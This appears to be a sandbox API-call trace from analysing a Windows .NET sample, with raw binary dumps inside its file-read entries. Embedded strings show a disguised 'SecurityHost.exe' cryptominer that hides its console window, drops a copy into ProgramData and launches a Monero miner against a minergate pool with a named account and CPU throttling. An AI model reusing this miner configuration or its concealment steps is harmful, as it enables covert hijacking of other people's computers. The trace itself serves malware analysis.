+-~{  
+*¥ 2{  i/	{  *~{  
+*   0 u     
+-rí psh  
+z{  ,{  o||  
+-*¥ *
++$o}  
+	90	0/*
+Z
+	0YX
+Xo~  
+2Ó2{  /**>s  (  *>s  (  *   0	 3       -r÷ psh  
+zo~  
+(4  -+o~  
+(6  þ*-r÷ psh  
+zo~  
+(6  þ*>s  (  *>s  (  *Â-r÷ psh  
+zo~  
+(4  -+o~  
+(6  *-r÷ psh  
+zo~  
+(6  *   0	 (       -r÷ psh  
+z(4  -+X(6  *>s  (  *>s  (  *º-r÷ psh  
+zo~  
+(4  -+o~  
+s±  *z-r÷ psh  
+zo~  
+s±  *Bs  (!  *Bs  (!  *¦-r÷ psh  
+z(4  -+o~  
+(#  *¦-r÷ psh  
+z(4  -+o~  
+(#  *0 u     -r÷ psh  
+z-r psh  
+z{	  oD  t3 
+,oÙ2 o  
+-+{  {  {  {  (2 
+{	  oE  oÛ2 *Bs  (&  *Bs  (&  *¦-r÷ psh  
+z(4  -+o~  
+((  *¦-r÷ psh  
+z(4  -+o~  
+((  *j-r÷ psh  
+z(Ü2 *>s  (+  *>s  (+  *¢-r÷ psh  
+z(4  -+o~  
+(-  *¢-r÷ psh  
+z(4  -+o~  
+(Ý2 *b-r÷ psh  
+z(Ý2 **(1  **(1  **(1  *-r psh  
+z-r5 psh  
+z(À1 *Ú{  ,rK p(W1 s  
+z}  sC  }  sF  }	  *>{  _þþ*B{  @_þþ*"(¿1 *  0 ¶     2
+o~  
+1rk prw p(W1 s  
+z2
+o~  
+1r£ pr± p(W1 s  
+z{  oA  t  -6{  ,{  oµ  + {
+  (9  -(l  
++(j  
+sD2 Xo  
+{  oB  *  0 i   	  ~  %(t  
+~  o  
+
++9o  
+{  (  
+,~  o  
+~  o  
+o  
+Þo  
+
+-ÄÞ
+,	(v  
+Ü**       Y[ 
+    0	 Ì   
+  
+~  %(t  
+~  o  
++9o  
+{  (  
+,~  o  
+~  o  
+o  
+Þxo  
+-Ä~  ,X{  {  {
+  {  {  {  {	  s?  
+~  o  
+&~  os  
+~  1
+~  ou  
+Þ,(v  
+Ü*	*    ¹½     N{      _þþ*Js  
+    * 0 D       (g  
+}  }  }  }  }  }  }  }  *>}  }  *0 ,     ||  (  
+-{  
+-	}  *}  **0 X       -rÕ psh  
+z{  3}  }  *{  -)||  (  
+-{  -t  }  }  *(g  
+*0 %     ||  (  
+-{  o  
+
+}  **||  (  
+-{  o  
+}  *Ns  
+}  (g  
+*{   *0     (g  
+,Bo~  
+s  
++o}  
+(  
+o  
+&Xo~  
+2Ùok  
+}   }#  }$  }%  -
+o~  
+Y+o~  
+
+o~  
+#0x000001b4#4096|,0,1542888188.749625
+SetFilePointer,128#0x000001b4#0,128,1542888188.749625
+NtReadFile,|0#PE  L ôß¡K        à "   .        .      @.   z                      `5    ÏP5  @                           Æ. O    @.  ü          
+5 H   @5    T.                                                              H           .text   þ.      .                   `.rsrc    ü  @.  þ  
+.             @  @.reloc      @5     5             @  B                ú.     H     Ì- º 	       Tè* ( Ô.                                    (g  
+**(  **(  *  0 Ó    (g #0x000001b4#512|,0,1542888188.749625
+SetFilePointer,376#0x000001b4#0,376,1542888188.749625
+NtReadFile,|0#.text   þ.      .                   `.rsrc    ü  @.  þ  
+.             @  @.reloc      @5     5             @  B                ú.     H     Ì- º 	       Tè* ( Ô.                                    (g  
+**(  **(  *  0 Ó    (g  
+-rµ psh  
+z2
+c,rÅ psi  
+z    _, ôüÿÿ_,rÅ psi  
+z    _,(j  
+ok  
++(l  
+ok  
+ (m  
+(n  
+¢rÕ p¢¢rÕ p¢¢(o  
+	(7  }  }  -h{  (2 
+{p% }  {q% }  (ß2 }
+  {
+  {0#0x000001b4#512|,0,1542888188.749625
+SetFilePointer,3011412#0x000001b4#0,3011412,1542888188.749625
+NtReadFile,|0#    ôß¡K       #   p. pó- RSDSé­µä
+Ô FkPèTµçÆ   System.pdb                                                    î.         .                         ú.           _CorDllMain mscoree.dll     ÿ%  z                                                                                                              x  É W 
+ ( )        ì½`I%&/mÊ{JõJ×àt¡`$Ø@ìÁÍæìiG#)«*ÊeVe]f@Ìí¼÷Þ{ï½÷Þ{ï½÷º;N'÷ßÿ?\fdlöÎJÚÉ!ªÈ?~||?      í½`I%&/mÊ{JõJ×àt¡`$Ø@ìÁÍæìiG#)«*ÊeVe]f@Ì#0x000001b4#512|,0,1542888188.749625
+SetFilePointer,3011440#0x000001b4#0,3011440,1542888188.749625
+NtReadFile,|0#RSDSé­µä
+Ô FkPèTµçÆ   System.pdb                                                    î.         .                         ú.           _CorDllMain mscoree.dll     ÿ%  z                                                                                                              x  É W 
+ ( )        ì½`I%&/mÊ{JõJ×àt¡`$Ø@ìÁÍæìiG#)«*ÊeVe]f@Ìí¼÷Þ{ï½÷Þ{ï½÷º;N'÷ßÿ?\fdlöÎJÚÉ!ªÈ?~||?      í½`I%&/mÊ{JõJ×àt¡`$Ø@ìÁÍæìiG#)«*ÊeVe]f@Ìí¼÷Þ{ï½÷Þ{ï½÷º;N'÷ßÿ?\fdl#0x000001b4#512|,0,1542888188.749625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.pdb#C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.pdb,3221225524,1542888188.749625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\symbols\dll\System.pdb#C:\Windows\symbols\dll\System.pdb,3221225530,1542888188.749625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\dll\System.pdb#C:\Windows\dll\System.pdb,3221225530,1542888188.749625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\System.pdb#C:\Windows\System.pdb,3221225524,1542888188.749625
+NtClose,0x000001b4,0,1542888188.749625
+SetErrorMode,32775,32773,1542888188.749625
+RegOpenKeyExW,0x000001b6#CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32#0x00020019#HKEY_CLASSES_ROOT\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32#0x80000000#0,0,1542888188.749625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\(Default)#0x000001b6##1#,0,1542888188.749625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\(Default)#0x000001b6##1#mscoree.dll,0,1542888188.749625
+RegCloseKey,0x000001b6,0,1542888188.749625
+RegOpenKeyExW,0x000001b6#CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server#0x00020019#HKEY_CLASSES_ROOT\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server#0x80000000#0,0,1542888188.749625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server\(Default)#0x000001b6##1#,0,1542888188.749625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server\(Default)#0x000001b6##1#diasymreader.dll,0,1542888188.749625
+RegCloseKey,0x000001b6,0,1542888188.749625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\diasymreader.dll#0#diasymreader#0x6ad10000,0,1542888188.765625
+LdrGetProcedureAddress,DllGetClassObject#diasymreader#0x6ad1d031#0#0x6ad10000,0,1542888188.765625
+SetErrorMode,32769,32775,1542888188.765625
+GetFileAttributesW,4294967295#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.PDB#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.PDB,4294967295,1542888188.765625
+NtCreateFile,128#1#1#96#1#0x000001b4#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,0,1542888188.765625
+GetFileType,0x000001b4,1,1542888188.765625
+SetFilePointer,0#0x000001b4#0,0,1542888188.765625
+NtReadFile,|0#MZ       ÿÿ  ¸       @                                      º ´	Í!¸LÍ!This program cannot be run in DOS mode.
+$       PE  L ¯îY        à " 0     
+      ª,       @    @                                 @                           X,  O    @                     `      +                                                               H           .text   °                           `.rsrc      @                    @  @.reloc      `                    @  B                ,      H     !  	                                                       0 "     (  (  &
+ (  
++$	o  
+r  p(  
+,X
+	X	i2Öþ,(  
+o  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+ s  
+%r  po  
+ %o  
+ %o  
+ ri  po  
+ (  
+&+K   Ð  (  
+  r p(  
+iþþ-Ûr p(  
+o  
+  @  (  
+ (  
+& +°"(  
+ * BSJB         v4.0.30319     l     #~      #Strings      ´  #US L     #GUID   \  <  #Blob         W	    ú3                                               Ð      1Ò Ò e   ò    D D õ D D QD jD ¤ D y ³ W ³ Ø D ¿ ò 38
+ V 
+   8  á              0sA   Q
+ `       Mc        qg  P      ?m  ~!    m     "    ||   	 m  m  m
+ ) m 1 m 9 m A m I m Q m Y m a m i m q m y m  *  4 0  4  :  + ¡ g?  m  '   ¼  ^  %  :D  D K  m   [ .  s .  || .   . # ¤ . + ¤ . 3 ¶ . ; ¤ . C ¤ . K ¤ . S ¤ . [ ¶ . c ¼ . k æ . s ó     M   q             @             R                 R 8         <Module> SW_HIDE mscorlib Thread hWnd set_FileName get_ProcessName GetProcessesByName GuidAttribute DebuggableAttribute ComVisibleAttribute AssemblyTitleAttribute AssemblyTrademarkAttribute TargetFrameworkAttribute AssemblyFileVersionAttribute AssemblyConfigurationAttribute AssemblyDescriptionAttribute CompilationRelaxationsAttribute AssemblyProductAttribute AssemblyCopyrightAttribute AssemblyCompanyAttribute RuntimeCompatibilityAttribute set_UseShellExecute SecurityHost.exe System.Threading System.Runtime.Versioning String kernel32.dll user32.dll Kill Program System Main System.Reflection ProcessStartInfo Sleep .ctor ertret45645645646yrtyrtyrtyrtyrtyrtyrtytrytr System.Diagnostics System.Runtime.InteropServices System.Runtime.CompilerServices DebuggingModes GetProcesses args GetCurrentProcess set_Arguments Object Start SecurityHost GetConsoleWindow set_CreateNoWindow ShowWindow nCmdShow op_Equality     S e c u r i t y H o s t  MC : \ P r o g r a m D a t a \ s y s t e m 8 6 \ S y s t e m V i b e . e x e  #- o   s t r a t u m + t c p : / / x m r . p o o l . m i n e r g a t e . c o m : 4 5 5 6 0   - O       x a r i t o n . a s a d u l l i n . 8 1 @ i n b o x . r u : x   - - m a x - c p u - u s a g e = 5 0   - k   - r 1   - R 1   - - d o n a t e - l e v e l = 1   - - p r i n t - t i m e = 1 0 T a s k M g r  S y s t e m V i b e  Ó<½§CêOW¼aÙÖ       	EII  I     I  IE I·z\V4à                TWrapNonExceptionThrows      SecurityHost      ) $face2e3f-98f4-4af6-b20f-4f9c582f969a   4.4.6.7  G .NETFramework,Version=v4.0 TFrameworkDisplayName.NET Framework 4     ¯îY         <+  <  RSDS 7­ÊmB®Úñ¨MT   C:\Users\Administrator\source\repos\ConsoleApp60\ConsoleApp60\obj\Debug\SecurityHost.pdb                                                                                                                                                                            ,          ,                          ,            _CorExeMain mscoree.dll     ÿ%  @                                                                                                                                                                                                                                                                                                                                                 #0x000001b4#4096|,0,1542888188.765625
+SetFilePointer,128#0x000001b4#0,128,1542888188.765625
+NtReadFile,|0#PE  L ¯îY        à " 0     
+      ª,       @    @                                 @                           X,  O    @                     `      +                                                               H           .text   °                           `.rsrc      @                    @  @.reloc      `                    @  B                ,      H     !  	                                                       0 "     (  (  &
+ (  
++$	o #0x000001b4#512|,0,1542888188.765625
+SetFilePointer,376#0x000001b4#0,376,1542888188.765625
+NtReadFile,|0#.text   °                           `.rsrc      @                    @  @.reloc      `                    @  B                ,      H     !  	                                                       0 "     (  (  &
+ (  
++$	o  
+r  p(  
+,X
+	X	i2Öþ,(  
+o  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+  ô  (  
+ s  
+%r  po  
+ %o  
+ %o  
+ ri  po  
+ (  
+&+K   Ð  (  
+  r p(  
+iþþ-Ûr p(  
+o  
+  @  (  
+ (  
+&#0x000001b4#512|,0,1542888188.765625
+SetFilePointer,3360#0x000001b4#0,3360,1542888188.765625
+NtReadFile,|0#    ¯îY         <+  <  RSDS 7­ÊmB®Úñ¨MT   C:\Users\Administrator\source\repos\ConsoleApp60\ConsoleApp60\obj\Debug\SecurityHost.pdb                                                                                                                                                                            ,          ,                          ,            _CorExeMain mscoree.dll     ÿ%  @                                                                                                                 #0x000001b4#512|,0,1542888188.765625
+SetFilePointer,3388#0x000001b4#0,3388,1542888188.765625
+NtReadFile,|0#RSDS 7­ÊmB®Úñ¨MT   C:\Users\Administrator\source\repos\ConsoleApp60\ConsoleApp60\obj\Debug\SecurityHost.pdb                                                                                                                                                                            ,          ,                          ,            _CorExeMain mscoree.dll     ÿ%  @                                                                                                                                             #0x000001b4#512|,0,1542888188.765625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x016b3000#4096#4#0,0,1542888188.765625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\SecurityHost.pdb#C:\Users\mag\AppData\Local\Temp\SecurityHost.pdb,3221225524,1542888188.765625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\symbols\exe\SecurityHost.pdb#C:\Windows\symbols\exe\SecurityHost.pdb,3221225530,1542888188.765625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\exe\SecurityHost.pdb#C:\Windows\exe\SecurityHost.pdb,3221225530,1542888188.765625
+NtCreateFile,128#1#5#2144#4294967295#0x00000000#0x80100080#\??\C:\Windows\SecurityHost.pdb#C:\Windows\SecurityHost.pdb,3221225524,1542888188.765625
+NtClose,0x000001b4,0,1542888188.765625
+SetErrorMode,32775,32773,1542888188.765625
+NtAllocateVirtualMemory,0#0#1776#65536#0xffffffff#0x01922000#4096#4#0,0,1542888188.765625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888188.781625
+LdrGetProcedureAddress,GetUserDefaultLocaleName#KERNEL32#0x7613fe4b#0#0x760b0000,0,1542888188.781625
+NtOpenKey,0x000001b4#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale,0,1542888188.781625
+NtOpenKey,0x000001b8#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale\Alternate Sorts,0,1542888188.781625
+NtOpenKey,0x000001bc#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Language Groups,0,1542888188.781625
+NtQueryValueKey,0x000001b4#00000409#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Locale\00000409#1#1,0,1542888188.781625
+NtQueryValueKey,0x000001bc#1#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Language Groups\1#1#1,0,1542888188.781625
+LdrGetDllHandle,0#kernel32#0x760b0000,0,1542888188.781625
+LdrGetProcedureAddress,GetUserPreferredUILanguages#KERNEL32#0x761195af#0#0x760b0000,0,1542888188.781625
+NtQueryValueKey,0x000001b4#00000409#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Locale\00000409#1#1,0,1542888188.781625
+NtQueryValueKey,0x000001bc#1#1#HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Language Groups\1#1#1,0,1542888188.781625
+LdrGetProcedureAddress,EventRegister#ADVAPI32#0x77a95adc#0#0x77730000,0,1542888188.781625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00672000#4096#4#0,0,1542888188.781625
+NtTerminateProcess,0xe0434352#1776#0xffffffff,0,1542888188.781625
